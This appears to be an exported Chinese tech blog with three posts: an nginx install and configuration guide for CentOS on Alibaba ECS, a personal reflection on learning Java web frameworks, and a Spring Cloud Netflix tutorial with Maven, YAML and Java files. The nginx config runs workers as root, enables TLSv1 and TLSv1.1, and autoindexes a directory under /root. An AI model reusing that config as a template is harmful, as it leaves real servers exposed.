    <content type="text"><![CDATA[url是什么只针对ecs上的nginx，不包含轻量级应用服务器 nginx简介Nginx是一款轻量级的网页服务器、反向代理服务器。相较于Apache、lighttpd具有占有内存少，稳定性高等优势。它最常的用途是提供反向代理服务。 安装过程nginx的启动需要三个包的支持 SSL功能需要openssl库1#yum install openssl gzip模块需要zlib库1#yum install zlib rewrite模块需要pcre库1#yum install pcre 安装Nginx依赖库1#rpm -Uvh http://nginx.org/packages/centos/7/noarch/RPMS/nginx-release-centos-7-0.el7.ngx.noarch.rpm 安装nginx1#yum install nginx 启动nginx1#service nginx start 公网地址直接进行访问配置信息CentOS安装Nginx后，安装在了 /etc/nginx/ 目录下，你可以打开 /etc/nginx/conf.d/default/conf 查看里面的配置，包括监听端口，域名和nginx访问的根目录 配置https://www.cnblogs.com/kingsonfu/p/9804131.html nginx常用命令 （ubuntu） 重新载入配置 1# /usr/local/nginx/sbin/nginx -s reload 启动nginx 1# /usr/local/nginx/sbin/nginx -c /usr/local/nginx/conf/nginx.conf 停用nginx 1# /usr/local/nginx/sbin/nginx -s stop nginx 配置123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146user root;worker_processes 1;#error_log logs/error.log;#error_log logs/error.log notice;#error_log logs/error.log info;#pid logs/nginx.pid;events &#123; worker_connections 1024;&#125;http &#123; include mime.types; default_type application/octet-stream; #log_format main '$remote_addr - $remote_user [$time_local] "$request" ' # '$status $body_bytes_sent "$http_referer" ' # '"$http_user_agent" "$http_x_forwarded_for"'; #access_log logs/access.log main; sendfile on; #tcp_nopush on; #keepalive_timeout 0; keepalive_timeout 65; #gzip on; server &#123; listen 80; server_name localhost; charset utf-8; #charset koi8-r; #access_log logs/host.access.log main; location / &#123; root html; index index.html index.htm; &#125; location /wechat/ &#123; alias /root/local/user/obox/pic/ ; autoindex on ; autoindex_exact_size on; autoindex_localtime on; &#125; #error_page 404 /404.html; # redirect server error pages to the static page /50x.html # error_page 500 502 503 504 /50x.html; location = /50x.html &#123; root html; &#125; # proxy the PHP scripts to Apache listening on 127.0.0.1:80 # #location ~ \.php$ &#123; # proxy_pass http://127.0.0.1; #&#125; # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000 # #location ~ \.php$ &#123; # root html; # fastcgi_pass 127.0.0.1:9000; # fastcgi_index index.php; # fastcgi_param SCRIPT_FILENAME /scripts$fastcgi_script_name; # include fastcgi_params; #&#125; # deny access to .htaccess files, if Apache's document root # concurs with nginx's one # #location ~ /\.ht &#123; # deny all; #&#125; &#125; # another virtual host using mix of IP-, name-, and port-based configuration # #server &#123; # listen 8000; # listen somename:8080; # server_name somename alias another.alias; # location / &#123; # root html; # index index.html index.htm; # &#125; #&#125; # HTTPS server # server &#123; listen 443; server_name www.net-obox.com net-obox.com; ssl on ; ssl_certificate /root/local/user/nginx/nginx-1.11.3/ssl/2618163_net-obox.com.pem; ssl_certificate_key /root/local/user/nginx/nginx-1.11.3/ssl/2618163_net-obox.com.key; ssl_session_cache shared:SSL:1m; ssl_session_timeout 5m; #设置长连接 keepalive_timeout 70; #减少点击劫持 add_header X-Frame-Options DENY; #禁止服务器自动解析资源类型 add_header X-Content-Type-Options nosniff; #防XSS攻击 add_header X-Xss-Protection 1; ssl_ciphers HIGH:!aNULL:!MD5; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; ssl_prefer_server_ciphers on; location / &#123; root html; index index.html index.htm; proxy_pass http://118.31.120.92:8080; &#125; &#125; server &#123; listen 80; server_name www.net-obox.com net-obox.com; #核心代码 return 301 https://$server_name$request_uri; &#125;&#125;]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2F2019%2F03%2F25%2Fdocker%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[SpringCloud-Netflix-03-个人理解]]></title>
    <url>%2F2019%2F03%2F25%2FSpringCloud-Netflix-03-%E4%B8%AA%E4%BA%BA%E6%80%9D%E8%80%83%2F</url>
    <content type="text"><![CDATA[说在前面的话经理了spring cloud的微服务的学习之后，还是有很多感悟的，毕竟从最开始的JavaEE ，SSM ，SpringBoot ， Springcloud算是把javaWeb的学习走到了尽头，对web的理解也算是颇有感悟。 Web的学习永远是颠覆你大爷的自学过程学习JavaWeb这部分的东西可以说是我自学路上的最可怕的过程，由于同时学习这个东西的人数着实比较少，感觉心里很没底，但是因为一头扎入团队中，也就是硬着头皮学习了，不幸，由于对从基层的基础语法到高层的架构项目实现，演进速度过快，导致我自己的思维无法跟上这一个转变，所以中间的一个空缺期是一个让我特别头大的过程，致使我无法把架构类的东西直接采用拿来主义快速投入使用，好在笨鸟先飞，这让我对web这一套花里胡哨的东西有了对底层的理解。所以总而言之，误打误撞也是以一个正确的姿势入了门。 何为web其实说起java web其实更准确的说是web后端，说的再明白一些其实是数据处理部分，是的，这不是网页那种花里胡哨的东西，很尴尬这里是完完全全的逻辑实现，完完整整的MVC思路的深入，直到你觉得mvc不再是刻意设计模式，而是顺理成章的开发思路。 为什么是颠覆？塑料段位说来都是痛苦，首先JavaEE学完了，servlet，generalservlet，httpservlet，jsp，el，过滤器，拦截器，再到建包模型，从接口道impi实例，当我学完的那一个瞬间，我以为我是个王者，结果，我才晋升到了塑料。 学习内容概述javaEE 可以是说是一切的基础了，后面的使用框架其实是简单的，反而最繁杂的东西是javaEE部分，各种接口，内置对象的东西，彼此关联但是也彼此分离。 servlet简单的理解，servlet其实就是一个小型的服务器，类似内置的在javaEE内部的一个小型的servlet 烂铁段位然后开始学习ssm，这是我生命中接触框架，一次就解除了三个，真好，然后开始了，xml，yml，propeities，maven，webapp开始层出不穷，开始我真的不知道maven是个什么鬼东西，就是觉得那些图标一出来牛逼的要死，直到后来我知道了这是个jar包的自动管理，xml就是个仿html的配置文档，yml是仿md的，propertis就是正常的语法配置，说道理，这一大堆就是用来注册的，保证你所需要的中间件可以注册道sprinbg 的容器之中，来保证你的所有使用都加入到框架的结构中，祝你开发更加简单，emmm，不得不说哈，我想起了某学长的一句很经典的话“框架就是让你的开发更加复杂，但是你又不得不用的东西”，是这样没错了。还行，我又头铁的学完了。从建立模型到成立，到数据持久化。总算是学完了，真好，我以为我是个王者，其实是个兰铁片。 黑铁段位了之后，开始进入了springboot学习阶段，是的，springboot的自动装配原理，导致我们的开发之路更加简单了，所有东西只要有注解什么都好，整合了绝大多数的驱动，比如 日志，模板，持久层，安全部分。庞大的信息量让人眼花缭乱，太多的选择让人绝望，不过确实，相比ssm，springboot真的是太简单了。简单的让人无法呼吸。 好了，从烂铁，到了黑铁了，冷静，还是铁。 入门了，青铜springcloud的学习其实才是真正的开发的启示，gitlab，服务机制，流量，高并发，高可用这才开始了我们真正对云端项目进行思考，容器的使用等，真的，你会发现其实之前学的真的只是冰山一角，那个只是解决了数据从前台到后台的方法，但是docker，docker-compose的学习这才是开始了我们对一个大型web项目的思考，当然还有没有学习的nexus，还有持续集成等等这些，这才是我们要整合的技能，我们对web的开眼其实这才开始。 归行合一大道之行，大道合一。目前主流技术，大数据，区块链，人工智能。看似是分立的东西。其实是一样的根源于互联网。公司发展分4步走，第一步web开发，前台后台微服务架构一起开发，项目上线准备赚钱。第二部，精准赚钱。大数据开始上线，统筹协同用户数据，实现个性化发展，分析用户需求，实现精准推荐。第三阶段，大数据加人工智能。人工智能是对管理和数据体系的智能化解决方案，不止是大家看到的机器人，公司规模扩大，势必有大量数据管理问题，人工智障发挥用途。第四步，区块链，区块链核心在于去中心化，链圈构建超级计算器，所谓超级计算器，就是世界各个地方服务器链接一起，构成超级的数据处理，其实我这觉得有点像是被植入木马挖矿。 这才是我们当今世界的样子，所谓的热门技术，都是一步步累计的，我这才知道学习这才是开始，相对于每天不知所以跟着老师按部就班，我可能更喜欢站在浪潮中看世界，现在我看到的世界就是这个样子，真的很宏观，很伟大，这也使得我对《浪潮之巅》这本书更加的敬佩。 雷军言：“站在风口上，猪也能飞起来”马云言：“站在风口上，飞起来的猪摔死的也更惨”]]></content>
  </entry>
  <entry>
    <title><![CDATA[SpringCloud-Netflix-02-创建项目]]></title>
    <url>%2F2019%2F03%2F23%2FSpringCloud-Netflix-02-%E5%88%9B%E5%BB%BA%E9%A1%B9%E7%9B%AE%2F</url>
    <content type="text"><![CDATA[说在前面的话微服务是面向工程创建起来的，那么微服务项目的创建当然是重头戏，springcloud是完全基于Springboot建立起来的，如果说没弄明白spingboot也就不需要学习springcloud了。 创建统一依赖管理在根目录下创建 Dictionary hello-spring-cloud-dependencies 创建pom.xml配置文件123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;!--springboot配置--&gt; &lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.0.3.RELEASE&lt;/version&gt; &lt;/parent&gt; &lt;!--项目目录 网站反写--&gt; &lt;groupId&gt;com.runindark&lt;/groupId&gt; &lt;artifactId&gt;hello-spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;1.0.0-SNAPSHOT&lt;/version&gt; &lt;packaging&gt;pom&lt;/packaging&gt; &lt;!--项目名称注册--&gt; &lt;name&gt;hello-spring-cloud-dependencies&lt;/name&gt; &lt;url&gt;http://www.runindark.com&lt;/url&gt; &lt;inceptionYear&gt;2018-Now&lt;/inceptionYear&gt; &lt;properties&gt; &lt;!-- Environment Settings --&gt; &lt;java.version&gt;1.8&lt;/java.version&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;project.reporting.outputEncoding&gt;UTF-8&lt;/project.reporting.outputEncoding&gt; &lt;!-- Spring Settings --&gt; &lt;spring-cloud.version&gt;Finchley.RELEASE&lt;/spring-cloud.version&gt; &lt;/properties&gt; &lt;!-- 版本控制 否则无法找到主类--&gt; &lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;$&#123;spring-cloud.version&#125;&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;/dependencyManagement&gt; &lt;build&gt; &lt;plugins&gt; &lt;!-- Compiler 插件, 设定 JDK 版本 --&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt; &lt;configuration&gt; &lt;showWarnings&gt;true&lt;/showWarnings&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;!-- 打包 jar 文件时，配置 manifest 文件，加入 lib 包的 jar 依赖 --&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-jar-plugin&lt;/artifactId&gt; &lt;configuration&gt; &lt;archive&gt; &lt;addMavenDescriptor&gt;false&lt;/addMavenDescriptor&gt; &lt;/archive&gt; &lt;/configuration&gt; &lt;executions&gt; &lt;execution&gt; &lt;configuration&gt; &lt;archive&gt; &lt;manifest&gt; &lt;!-- Add directory entries --&gt; &lt;addDefaultImplementationEntries&gt;true&lt;/addDefaultImplementationEntries&gt; &lt;addDefaultSpecificationEntries&gt;true&lt;/addDefaultSpecificationEntries&gt; &lt;addClasspath&gt;true&lt;/addClasspath&gt; &lt;/manifest&gt; &lt;/archive&gt; &lt;/configuration&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;/plugin&gt; &lt;!-- resource --&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-resources-plugin&lt;/artifactId&gt; &lt;/plugin&gt; &lt;!-- install --&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-install-plugin&lt;/artifactId&gt; &lt;/plugin&gt; &lt;!-- clean --&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-clean-plugin&lt;/artifactId&gt; &lt;/plugin&gt; &lt;!-- ant --&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-antrun-plugin&lt;/artifactId&gt; &lt;/plugin&gt; &lt;!-- dependency --&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-dependency-plugin&lt;/artifactId&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;pluginManagement&gt; &lt;plugins&gt; &lt;!-- Java Document Generate --&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-javadoc-plugin&lt;/artifactId&gt; &lt;executions&gt; &lt;execution&gt; &lt;phase&gt;prepare-package&lt;/phase&gt; &lt;goals&gt; &lt;goal&gt;jar&lt;/goal&gt; &lt;/goals&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;/plugin&gt; &lt;!-- YUI Compressor (CSS/JS压缩) --&gt; &lt;plugin&gt; &lt;groupId&gt;net.alchim31.maven&lt;/groupId&gt; &lt;artifactId&gt;yuicompressor-maven-plugin&lt;/artifactId&gt; &lt;version&gt;1.5.1&lt;/version&gt; &lt;executions&gt; &lt;execution&gt; &lt;phase&gt;prepare-package&lt;/phase&gt; &lt;goals&gt; &lt;goal&gt;compress&lt;/goal&gt; &lt;/goals&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;configuration&gt; &lt;encoding&gt;UTF-8&lt;/encoding&gt; &lt;jswarn&gt;false&lt;/jswarn&gt; &lt;nosuffix&gt;true&lt;/nosuffix&gt; &lt;linebreakpos&gt;30000&lt;/linebreakpos&gt; &lt;force&gt;true&lt;/force&gt; &lt;includes&gt; &lt;include&gt;**/*.js&lt;/include&gt; &lt;include&gt;**/*.css&lt;/include&gt; &lt;/includes&gt; &lt;excludes&gt; &lt;exclude&gt;**/*.min.js&lt;/exclude&gt; &lt;exclude&gt;**/*.min.css&lt;/exclude&gt; &lt;/excludes&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/pluginManagement&gt; &lt;!-- 资源文件配置 --&gt; &lt;resources&gt; &lt;resource&gt; &lt;directory&gt;src/main/java&lt;/directory&gt; &lt;excludes&gt; &lt;exclude&gt;**/*.java&lt;/exclude&gt; &lt;/excludes&gt; &lt;/resource&gt; &lt;resource&gt; &lt;directory&gt;src/main/resources&lt;/directory&gt; &lt;/resource&gt; &lt;/resources&gt; &lt;/build&gt; &lt;!--配置仓库--&gt; &lt;repositories&gt; &lt;repository&gt; &lt;id&gt;aliyun-repos&lt;/id&gt; &lt;name&gt;Aliyun Repository&lt;/name&gt; &lt;url&gt;http://maven.aliyun.com/nexus/content/groups/public&lt;/url&gt; &lt;releases&gt; &lt;enabled&gt;true&lt;/enabled&gt; &lt;/releases&gt; &lt;snapshots&gt; &lt;enabled&gt;false&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/repository&gt; &lt;repository&gt; &lt;id&gt;sonatype-repos&lt;/id&gt; &lt;name&gt;Sonatype Repository&lt;/name&gt; &lt;url&gt;https://oss.sonatype.org/content/groups/public&lt;/url&gt; &lt;releases&gt; &lt;enabled&gt;true&lt;/enabled&gt; &lt;/releases&gt; &lt;snapshots&gt; &lt;enabled&gt;false&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/repository&gt; &lt;repository&gt; &lt;id&gt;sonatype-repos-s&lt;/id&gt; &lt;name&gt;Sonatype Repository&lt;/name&gt; &lt;url&gt;https://oss.sonatype.org/content/repositories/snapshots&lt;/url&gt; &lt;releases&gt; &lt;enabled&gt;false&lt;/enabled&gt; &lt;/releases&gt; &lt;snapshots&gt; &lt;enabled&gt;true&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/repository&gt; &lt;repository&gt; &lt;id&gt;spring-snapshots&lt;/id&gt; &lt;name&gt;Spring Snapshots&lt;/name&gt; &lt;url&gt;https://repo.spring.io/snapshot&lt;/url&gt; &lt;snapshots&gt; &lt;enabled&gt;true&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/repository&gt; &lt;repository&gt; &lt;id&gt;spring-milestones&lt;/id&gt; &lt;name&gt;Spring Milestones&lt;/name&gt; &lt;url&gt;https://repo.spring.io/milestone&lt;/url&gt; &lt;snapshots&gt; &lt;enabled&gt;false&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/repository&gt; &lt;/repositories&gt; &lt;pluginRepositories&gt; &lt;pluginRepository&gt; &lt;id&gt;aliyun-repos&lt;/id&gt; &lt;name&gt;Aliyun Repository&lt;/name&gt; &lt;url&gt;http://maven.aliyun.com/nexus/content/groups/public&lt;/url&gt; &lt;releases&gt; &lt;enabled&gt;true&lt;/enabled&gt; &lt;/releases&gt; &lt;snapshots&gt; &lt;enabled&gt;false&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/pluginRepository&gt; &lt;/pluginRepositories&gt;&lt;/project&gt; maven管理pom.xml文件 设置项目工程jdk 第一步第二步 服务注册与发现创建Dictionary hello-spring-cloud-eureka 创建文件目录 如图 创建pom.xml配置文件12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;parent&gt; &lt;groupId&gt;com.funtl&lt;/groupId&gt; &lt;artifactId&gt;hello-spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;1.0.0-SNAPSHOT&lt;/version&gt; &lt;relativePath&gt;../hello-spring-cloud-dependencies/pom.xml&lt;/relativePath&gt; &lt;/parent&gt; &lt;artifactId&gt;hello-spring-cloud-eureka&lt;/artifactId&gt; &lt;packaging&gt;jar&lt;/packaging&gt; &lt;name&gt;hello-spring-cloud-eureka&lt;/name&gt; &lt;url&gt;http://www.funtl.com&lt;/url&gt; &lt;inceptionYear&gt;2018-Now&lt;/inceptionYear&gt; &lt;dependencies&gt; &lt;!-- Spring Boot Begin --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;!-- Spring Boot End --&gt; &lt;!--eureka配置--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-server&lt;/artifactId&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;configuration&gt; &lt;mainClass&gt;com.funtl.hello.spring.cloud.eureka.EurekaApplication&lt;/mainClass&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-surefire-plugin&lt;/artifactId&gt; &lt;version&gt;2.4.2&lt;/version&gt; &lt;configuration&gt; &lt;skipTests&gt;true&lt;/skipTests&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt;&lt;/project&gt; 配置application.yml12345678910111213141516spring: application: name: hello-spring-cloud-eurekaserver: port: 8761eureka: instance: hostname: localhost client: registerWithEureka: false fetchRegistry: false serviceUrl: defaultZone: http://$&#123;eureka.instance.hostname&#125;:$&#123;server.port&#125;/eureka/ 配置EurekaApplication1234567891011121314151617package com.funtl.hello.spring.cloud.eureka;import org.springframework.boot.SpringApplication;import org.springframework.boot.autoconfigure.SpringBootApplication;import org.springframework.cloud.netflix.eureka.server.EnableEurekaServer;@SpringBootApplication@EnableEurekaServerpublic class EurekaApplication &#123; public static void main(String[] args) &#123; SpringApplication.run(EurekaApplication.class, args); &#125;&#125; 创建服务提供者创建Dictionary hello-spring-cloud-service-admnin 创建文件目录 如图 创建pom.xml配置文件12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;parent&gt; &lt;groupId&gt;com.funtl&lt;/groupId&gt; &lt;artifactId&gt;hello-spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;1.0.0-SNAPSHOT&lt;/version&gt; &lt;relativePath&gt;../hello-spring-cloud-dependencies/pom.xml&lt;/relativePath&gt; &lt;/parent&gt; &lt;artifactId&gt;hello-spring-cloud-service-admin&lt;/artifactId&gt; &lt;packaging&gt;jar&lt;/packaging&gt; &lt;name&gt;hello-spring-cloud-service-admin&lt;/name&gt; &lt;url&gt;http://www.funtl.com&lt;/url&gt; &lt;inceptionYear&gt;2018-Now&lt;/inceptionYear&gt; &lt;dependencies&gt; &lt;!-- Spring Boot Begin --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;!-- Spring Boot End --&gt; &lt;!-- Spring Cloud Begin --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-server&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-web&lt;/artifactId&gt; &lt;version&gt;5.0.9.RELEASE&lt;/version&gt; &lt;/dependency&gt; &lt;!-- Spring Cloud End --&gt; &lt;/dependencies&gt; &lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;configuration&gt; &lt;mainClass&gt;com.funtl.hello.spring.cloud.service.admin.ServiceAdminApplication&lt;/mainClass&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt;&lt;/project&gt; 创建application.yml配置文件1234567891011spring: application: name: hello-spring-cloud-service-adminserver: port: 8762eureka: client: serviceUrl: defaultZone: http://localhost:8761/eureka/ 配置多服务启动 原因 由于分布式的构造需求，我们不可能由一个项目来提供服务，所以可以通过不同的端口进行多服务的高并发，高可用，因此需要在idea中设置相同工程多个同时启动。 启动方法配置ServiceAdminApplication1234567891011121314package com.funtl.hello.spring.cloud.service.admin;import org.springframework.boot.SpringApplication;import org.springframework.boot.autoconfigure.SpringBootApplication;import org.springframework.cloud.netflix.eureka.EnableEurekaClient;@SpringBootApplication@EnableEurekaClientpublic class ServiceAdminApplication &#123; public static void main(String[] args)&#123; SpringApplication.run(ServiceAdminApplication.class,args); &#125;&#125; 配置AdminController12345678910111213141516171819202122package com.funtl.hello.spring.cloud.service.admin.controller;import org.springframework.beans.factory.annotation.Value;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RequestMethod;import org.springframework.web.bind.annotation.RestController;@RestControllerpublic class AdminController &#123; @Value("$&#123;server.port&#125;") private String port ; @RequestMapping(value = "hi" , method = RequestMethod.GET) public String sayHi(String message)&#123; return String.format("Hi your message is : %s port: %s",message,port); &#125;&#125; 创建服务消费者（实现熔断机制）服务消费者介绍在springcloud-netfli下是存在有两种服务消费者的分别是ribbon和feign两种，但是真正使用起来，我们常用的是feign的方式进行服务消费者的构建，feign是ｒibbon的再封装，而且feign的使用也更加简单。(博客记录仅有feign) 创建Dictionary hello-spring-cloud-web-admin-feign ### 创建目录结构 如图 配置pom.xml12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;parent&gt; &lt;groupId&gt;com.funtl&lt;/groupId&gt; &lt;artifactId&gt;hello-spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;1.0.0-SNAPSHOT&lt;/version&gt; &lt;relativePath&gt;../hello-spring-cloud-dependencies/pom.xml&lt;/relativePath&gt; &lt;/parent&gt; &lt;artifactId&gt;hello-spring-cloud-web-admin-feign&lt;/artifactId&gt; &lt;packaging&gt;jar&lt;/packaging&gt; &lt;name&gt;hello-spring-cloud-web-admin-feign&lt;/name&gt; &lt;url&gt;http://www.funtl.com&lt;/url&gt; &lt;inceptionYear&gt;2018-Now&lt;/inceptionYear&gt; &lt;dependencies&gt; &lt;!-- Spring Boot Begin --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-tomcat&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-thymeleaf&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;!-- Spring Boot End --&gt; &lt;!-- Spring Cloud Begin --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-server&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!-- Spring Cloud End --&gt; &lt;!-- 解决 thymeleaf 模板引擎一定要执行严格的 html5 格式校验问题 --&gt; &lt;dependency&gt; &lt;groupId&gt;net.sourceforge.nekohtml&lt;/groupId&gt; &lt;artifactId&gt;nekohtml&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--hystrix仪表盘--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-hystrix-dashboard&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-config&lt;/artifactId&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;configuration&gt; &lt;mainClass&gt;com.funtl.hello.spring.cloud.web.admin.feign.WebAdminFeignApplication&lt;/mainClass&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt;&lt;/project&gt; 配置application.yml12345678910111213141516171819202122232425262728spring: application: name: hello-spring-cloud-web-admin-feign thymeleaf: cache: false mode: LEGACYHTML5 encoding: UTF-8 servlet: content-type: text/html cloud: config: uri: http://localhost:8888 name: config-client label: master profile: devserver: port: 8765eureka: client: serviceUrl: defaultZone: http://localhost:8761/eureka///熔断机制开启feign: hystrix: enabled: true 